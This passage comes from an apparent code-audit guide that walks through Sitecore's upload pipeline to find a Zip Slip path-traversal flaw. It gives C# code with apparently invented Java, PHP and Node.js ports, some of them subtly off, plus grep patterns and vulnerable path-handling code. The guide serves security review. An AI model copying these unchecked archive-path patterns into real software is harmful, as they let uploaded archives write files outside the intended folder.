    let versioned = urlHandle["Versioned"] === "1";
    let allowedFileTypes = urlHandle["AllowedFileTypes"];

    UrlHandle.disposeHandle(urlHandle);

    let uploadArgs = new UploadArgs();
    uploadArgs.Files = this.request.files;
    uploadArgs.Overwrite = overwrite;
    uploadArgs.Unpack = unpack;
    uploadArgs.Versioned = versioned;
    uploadArgs.Language = Language.parse(name);
    uploadArgs.AllowedFileTypes = allowedFileTypes;

    if (text && text.length > 0) {
        uploadArgs.Folder = text;
        uploadArgs.Destination = UploadDestination.Database;
    } else {
        uploadArgs.Folder = folder;
        uploadArgs.Destination = UploadDestination.File;
        uploadArgs.FileOnly = true;
    }

    let pipeline = PipelineFactory.getPipeline("uiUpload");
    pipeline.start(uploadArgs);
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
If the processing flow reaches a pipeline, map and analyze the pipeline flow, and trace the data flow until the method that finally saves the uploaded file to the system (Note: Pipelines are usually defined in configuration files and contain step-by-step processing methods)

```xml
<uiUpload>
  <processor mode="on" type="Sitecore.Pipelines.Upload.CheckPermissions, Sitecore.Kernel" />
  <processor mode="on" type="Sitecore.Pipelines.Upload.ValidateContentType, Sitecore.Kernel" />
  <processor mode="on" type="Sitecore.Pipelines.Upload.CheckSize, Sitecore.Kernel" />
  <processor mode="on" type="Sitecore.Pipelines.Upload.CheckSvgForJs, Sitecore.Kernel" resolve="true" />
  <processor mode="on" type="Sitecore.Pipelines.Upload.ResolveFolder, Sitecore.Kernel" />
  <processor mode="on" type="Sitecore.Pipelines.Upload.Save, Sitecore.Kernel" />
  <processor mode="on" type="Sitecore.Pipelines.Upload.Done, Sitecore.Kernel" />
</uiUpload>
```
{% endstep %}

{% step %}
After reaching the final file-saving method, check whether there is a separate upload path that directly processes `ZIP` or `TAR` files. If yes, target the archive handling functionality

{% tabs %}
{% tab title="C#" %}
```csharp
public void Process(UploadArgs args)
{
	Assert.ArgumentNotNull(args, "args");
	for (int i = 0; i < args.Files.Count; i++)
	{
		HttpPostedFile httpPostedFile = args.Files[i];
		if (!string.IsNullOrEmpty(httpPostedFile.FileName))
		{
			try
			{
				bool flag = UploadProcessor.IsUnpack(args, httpPostedFile);
				if (args.FileOnly)
				{
					if (flag)
					{
						Save.UnpackToFile(args, httpPostedFile); // [1]
					}
					else
					{
						string filename = this.UploadToFile(args, httpPostedFile); // [2]
						if (i == 0)
						{
							args.Properties["filename"] = FileHandle.GetFileHandle(filename);
						}
					}
				}
			}
		}
	}
}
```
{% endtab %}

{% tab title="Java" %}
```java
public void process(UploadArgs args) {
    Assert.argumentNotNull(args, "args");

    for (int i = 0; i < args.getFiles().size(); i++) {
        HttpPostedFile httpPostedFile = args.getFiles().get(i);

        if (httpPostedFile.getFileName() != null && !httpPostedFile.getFileName().isEmpty()) {
            try {
                boolean flag = UploadProcessor.isUnpack(args, httpPostedFile);

                if (args.isFileOnly()) {
                    if (flag) {
                        Save.unpackToFile(args, httpPostedFile);
                    } else {
                        String filename = this.uploadToFile(args, httpPostedFile);

                        if (i == 0) {
                            args.getProperties().put("filename", FileHandle.getFileHandle(filename));
                        }
                    }
                }
            } catch (Exception ex) {
                throw ex;
            }
        }
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public function process($args)
{
    Assert::argumentNotNull($args, "args");

    for ($i = 0; $i < count($args->Files); $i++) {

        $httpPostedFile = $args->Files[$i];

        if (!empty($httpPostedFile->FileName)) {

            try {
                $flag = UploadProcessor::isUnpack($args, $httpPostedFile);

                if ($args->FileOnly) {

                    if ($flag) {
                        Save::unpackToFile($args, $httpPostedFile);
                    } else {
                        $filename = $this->uploadToFile($args, $httpPostedFile);

                        if ($i == 0) {
                            $args->Properties["filename"] = FileHandle::getFileHandle($filename);
                        }
                    }
                }

            } catch (Exception $ex) {
                throw $ex;
            }
        }
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
process(args) {
    Assert.argumentNotNull(args, "args");

    for (let i = 0; i < args.Files.length; i++) {

        let httpPostedFile = args.Files[i];

        if (httpPostedFile.FileName && httpPostedFile.FileName.length > 0) {

            try {
                let flag = UploadProcessor.isUnpack(args, httpPostedFile);

                if (args.FileOnly) {

                    if (flag) {
                        Save.unpackToFile(args, httpPostedFile);
                    } else {
                        let filename = this.uploadToFile(args, httpPostedFile);

                        if (i === 0) {
                            args.Properties["filename"] = FileHandle.getFileHandle(filename);
                        }
                    }
                }

            } catch (ex) {
                throw ex;
            }
        }
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Analyze the flow of the method that processes the ZIP file

{% tabs %}
{% tab title="C#" %}
```csharp
private static void UnpackToFile(UploadArgs args, HttpPostedFile file)
{
    string filename = FileUtil.MapPath(TempFolder.GetFilename("temp.zip"));
    file.SaveAs(filename);

    using (ZipArchive zipArchive = new ZipArchive(file.InputStream))
    {
        string invalidEntryName;

        if (!Save.VerifyArchiveFilesName(args, zipArchive.Entries, file.FileName, out invalidEntryName))
        {
            Save.AbortPipeline(args, file.FileName, invalidEntryName);
        }
        else
        {
            Save.SaveUnpackedFiles(args, zipArchive.Entries);
        }
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
private static void unpackToFile(UploadArgs args, HttpPostedFile file) throws Exception {

    String filename = FileUtil.mapPath(TempFolder.getFilename("temp.zip"));
    file.saveAs(filename);

    try (ZipInputStream zipArchive = new ZipInputStream(file.getInputStream())) {

        List<ZipEntry> entries = new ArrayList<>();
        ZipEntry entry;

        while ((entry = zipArchive.getNextEntry()) != null) {
            entries.add(entry);
        }

        String[] invalidEntryName = new String[1];

        if (!Save.verifyArchiveFilesName(args, entries, file.getFileName(), invalidEntryName)) {
            Save.abortPipeline(args, file.getFileName(), invalidEntryName[0]);
        } else {
            Save.saveUnpackedFiles(args, entries);
        }
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
private static function unpackToFile($args, $file)
{
    $filename = FileUtil::mapPath(TempFolder::getFilename("temp.zip"));
    $file->saveAs($filename);

    $zipArchive = new ZipArchive();
    $zipArchive->open($file->InputStream);

    $entries = [];
    for ($i = 0; $i < $zipArchive->numFiles; $i++) {
        $entries[] = $zipArchive->statIndex($i);
    }

    $invalidEntryName = null;

    if (!Save::verifyArchiveFilesName($args, $entries, $file->FileName, $invalidEntryName)) {
        Save::abortPipeline($args, $file->FileName, $invalidEntryName);
    } else {
        Save::saveUnpackedFiles($args, $entries);
    }

    $zipArchive->close();
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
static unpackToFile(args, file) {

    let filename = FileUtil.mapPath(TempFolder.getFilename("temp.zip"));
    file.saveAs(filename);

    let zipArchive = new AdmZip(file.InputStream);
    let entries = zipArchive.getEntries();

    let invalidEntryName = null;

    if (!Save.verifyArchiveFilesName(args, entries, file.FileName, (name) => { invalidEntryName = name; })) {
        Save.abortPipeline(args, file.FileName, invalidEntryName);
    } else {
        Save.saveUnpackedFiles(args, entries);
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Identify the method that finalizes the filename before saving (Normalize / Sanitize / Unique Name Generator)

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C#" %}
```regex
(ZipArchiveEntry\s*\.)|(ExtractToDirectory\s*\()|(FileStream\s*\()|(File\.WriteAll)|(Path\.Combine\s*\()
```
{% endtab %}

{% tab title="Java" %}
```regex
(ZipEntry\s*\.\s*getName\s*\()|(getNextEntry\s*\()|(new\s+File\s*\()|(FileOutputStream\s*\()|(Files\.write\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regex
(ZipArchive\s*\()|(extractTo\s*\()|(fopen\s*\()|(file_put_contents\s*\()
```
{% endtab %}

{% tab title="Node.js" %}
```regex
(entryName)|(getData\s*\()|(createFile\s*\()|(fs\.writeFile)|(extract(All|To))|(path\.join\s*\()|(makePath\s*\()
```
{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection (Linux))**

{% tabs %}
{% tab title="C#" %}
```regex
ZipArchiveEntry\s*\.|ExtractToDirectory\s*\(|FileStream\s*\(|File\.WriteAll|Path\.Combine\s*\(
```
{% endtab %}

{% tab title="Java" %}
```regex
ZipEntry\s*\.\s*getName\s*\(|getNextEntry\s*\(|new\s+File\s*\(|FileOutputStream\s*\(|Files\.write\s*\(
```
{% endtab %}

{% tab title="PHP" %}
```regex
ZipArchive\s*\(|extractTo\s*\(|fopen\s*\(|file_put_contents\s*\(
```
{% endtab %}

{% tab title="Node.js" %}
```regex
entryName|getData\s*\(|createFile\s*\(|fs\.writeFile|extract(All|To)|path\.join\s*\(|makePath\s*\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Patterns**

{% tabs %}
{% tab title="C#" %}
```csharp
private static void SaveUnpackedFiles(UploadArgs args, IReadOnlyCollection<ZipArchiveEntry> archiveEntries)
{
    foreach (ZipArchiveEntry zipArchiveEntry in archiveEntries)
    {
        string text = FileUtil.MakePath(args.Folder, zipArchiveEntry.FullName, '\\');

        if (!args.Overwrite)
        {
            text = FileUtil.GetUniqueFilename(text);
        }

        FileUtil.CreateFile(text, zipArchiveEntry.Open(), true);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
private static void saveUnpackedFiles(UploadArgs args, Collection<ZipEntry> archiveEntries) throws Exception {

    for (ZipEntry zipArchiveEntry : archiveEntries) {

        String text = FileUtil.makePath(args.getFolder(), zipArchiveEntry.getName(), '\\');

        if (!args.isOverwrite()) {
            text = FileUtil.getUniqueFilename(text);
        }

        try (InputStream inputStream = zipArchiveEntry.getInputStream()) {
            FileUtil.createFile(text, inputStream, true);
        }
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
private static function saveUnpackedFiles($args, $archiveEntries)
{
    foreach ($archiveEntries as $zipArchiveEntry) {

        $text = FileUtil::makePath($args->Folder, $zipArchiveEntry['name'], '\\');

        if (!$args->Overwrite) {
            $text = FileUtil::getUniqueFilename($text);
        }

        $stream = fopen($zipArchiveEntry['name'], 'r');
        FileUtil::createFile($text, $stream, true);
        fclose($stream);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
static saveUnpackedFiles(args, archiveEntries) {

    for (let zipArchiveEntry of archiveEntries) {

        let text = FileUtil.makePath(args.Folder, zipArchiveEntry.entryName, '\\');

        if (!args.Overwrite) {
            text = FileUtil.getUniqueFilename(text);
        }

        let inputStream = zipArchiveEntry.getData();
        FileUtil.createFile(text, inputStream, true);
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Check whether any logical decision (`if` / `flag` / `branch`) is made based on the raw input before normalization. If a logical decision is based on raw input, check whether a special character (such as `\`, `/`, `:`, `.`) can change the execution path. Also verify whether that character is later removed or replaced during sanitization while its logical impact still remains

{% tabs %}
{% tab title="C#" %}
```csharp
public static string GetUniqueFilename(string filePath)
{
	bool flag = filePath.IndexOf('\\') >= 0; // [1]
	string validFilePath = FileUtil.GetValidFilePath(filePath); // [2]
	string text = FileUtil.MapPath(validFilePath); // [3]

	string directoryName = Path.GetDirectoryName(text);
	string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(text);
	string extension = Path.GetExtension(text);

	int num = 1;
	string text2 = fileNameWithoutExtension;

	while (FileUtil.FileExists(text))
	{
		text2 = fileNameWithoutExtension + "_" + num.ToString("000");
		text = directoryName + "\\" + text2 + extension;
		num++;
	}

	if (flag)
	{
		return text; // [4]
	}

	int num2 = validFilePath.LastIndexOf('/'); // [5]
	if (num2 < 0)
	{
		return text2 + extension;
	}
	return validFilePath.Substring(0, num2 + 1) + text2 + extension;
}
```
{% endtab %}

{% tab title="Java" %}
```java
public static String getUniqueFilename(String filePath) {

    boolean flag = filePath.indexOf('\\') >= 0;
    String validFilePath = FileUtil.getValidFilePath(filePath);
    String text = FileUtil.mapPath(validFilePath);

    String directoryName = new File(text).getParent();
    String fileName = new File(text).getName();

    int dotIndex = fileName.lastIndexOf('.');
    String fileNameWithoutExtension = (dotIndex >= 0) ? fileName.substring(0, dotIndex) : fileName;
    String extension = (dotIndex >= 0) ? fileName.substring(dotIndex) : "";

    int num = 1;
    String text2 = fileNameWithoutExtension;

    while (FileUtil.fileExists(text)) {
        text2 = fileNameWithoutExtension + "_" + String.format("%03d", num);
        text = directoryName + "\\" + text2 + extension;
        num++;
    }

    if (flag) {
        return text;
    }

    int num2 = validFilePath.lastIndexOf('/');
    if (num2 < 0) {
        return text2 + extension;
    }

    return validFilePath.substring(0, num2 + 1) + text2 + extension;
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public static function getUniqueFilename($filePath)
{
    $flag = strpos($filePath, '\\') !== false;
    $validFilePath = FileUtil::getValidFilePath($filePath);
    $text = FileUtil::mapPath($validFilePath);

    $directoryName = dirname($text);
    $fileNameWithoutExtension = pathinfo($text, PATHINFO_FILENAME);
    $extension = '.' . pathinfo($text, PATHINFO_EXTENSION);

    $num = 1;
    $text2 = $fileNameWithoutExtension;

    while (FileUtil::fileExists($text)) {
        $text2 = $fileNameWithoutExtension . "_" . str_pad($num, 3, "0", STR_PAD_LEFT);
        $text = $directoryName . "\\" . $text2 . $extension;
        $num++;
    }

    if ($flag) {
        return $text;
    }

    $num2 = strrpos($validFilePath, '/');
    if ($num2 === false) {
        return $text2 . $extension;
    }

    return substr($validFilePath, 0, $num2 + 1) . $text2 . $extension;
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
static getUniqueFilename(filePath) {

    let flag = filePath.indexOf('\\') >= 0;
    let validFilePath = FileUtil.getValidFilePath(filePath);
    let text = FileUtil.mapPath(validFilePath);

    const path = require("path");

    let directoryName = path.dirname(text);
    let fileNameWithoutExtension = path.parse(text).name;
    let extension = path.parse(text).ext;

    let num = 1;
    let text2 = fileNameWithoutExtension;

    while (FileUtil.fileExists(text)) {
        text2 = fileNameWithoutExtension + "_" + num.toString().padStart(3, '0');
        text = directoryName + "\\" + text2 + extension;
        num++;
    }

    if (flag) {
        return text;
    }

    let num2 = validFilePath.lastIndexOf('/');
    if (num2 < 0) {
        return text2 + extension;
    }

    return validFilePath.substring(0, num2 + 1) + text2 + extension;
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Finally, find the function that converts a relative path into a physical path, and check whether it automatically prepends the Application Root or Webroot

{% tabs %}
{% tab title="C#" %}
```csharp
public static string MapPath(HttpContextBase context, string path)
{
    HttpServerUtilityBase server = WebUtil.GetServer(context);

    if (server != null)
    {
        return server.MapPath(path);
    }

    return null;
}
```
{% endtab %}

{% tab title="Java" %}
```java
public static String mapPath(HttpServletRequest context, String path) {

    ServletContext server = WebUtil.getServer(context);

    if (server != null) {
        return server.getRealPath(path);
    }

    return null;
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public static function mapPath($context, $path)
{
    $server = WebUtil::getServer($context);

    if ($server != null) {
        return $server->mapPath($path);
    }

    return null;
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
static mapPath(context, path) {

    let server = WebUtil.getServer(context);

    if (server != null) {
        return server.mapPath(path);
    }

    return null;
}
```
{% endtab %}
{% endtabs %}
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
